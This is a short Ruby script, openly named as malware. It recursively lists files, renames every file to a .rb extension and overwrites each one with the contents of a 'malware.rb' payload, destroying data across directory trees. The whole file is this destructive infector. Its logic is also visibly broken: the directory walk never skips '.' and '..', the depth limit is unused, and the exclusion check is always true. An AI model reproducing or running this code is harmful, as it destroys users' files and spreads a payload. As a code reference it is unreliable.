# Find files in given path
def find_files(files, directories, path = Dir.pwd, max_depth = 10)  
  Dir.foreach(path) do |entry|
      full_path = File.join(path, entry)
      if File.directory?(full_path)
          directories << full_path
          find_files(files, directories, full_path, max_depth - 1)  
      else
          files << full_path
      end
  end
end

# Change files to ruby files
def convert_files_to_ruby(files)
  # Get file in files
  for file in files do
      # Split file name to get extension and name of the file
      file_name = file.split('.')
      # Rename the original file (change extension of this file to rb)
      begin
          if file_name[0] != 'main.rb' or file_name[0] != 'malware.rb'
              File.rename(file, file_name[0] + '.rb')  # Use the full file path
          end
      rescue
          next
      end
  end
end

# Inject content of malware.rb to other files
def inject_malware_to_all_ruby_files(files, malware)
  # content of malware
  content = ''

  files.each do |file|
      next if file == __FILE__

      begin
          # Get content of malware.rb
          File.open(malware, 'r') do |file_malware|
          content = file_malware.read()
      end

          # Write current file that selected (except: main.rb)
          File.open(file, 'w') do |file_target|
              file_target.write(content)
          end
      rescue
          next
      end
  end
end  

# Combine all steps into one
def Main()
  files, directories = [], []
  malware = Dir.pwd + '/malware.rb'  

  # Current path firstly
  find_files(files, directories)
  convert_files_to_ruby(files)

  # Process files within directories
  directories.each do |directory|
      files_in_dir = []
      find_files(files_in_dir, [], directory)
      convert_files_to_ruby(files_in_dir)  
      inject_malware_to_all_ruby_files(files_in_dir, malware)
  end
end

if $PROGRAM_NAME == __FILE__
  Main()
end  
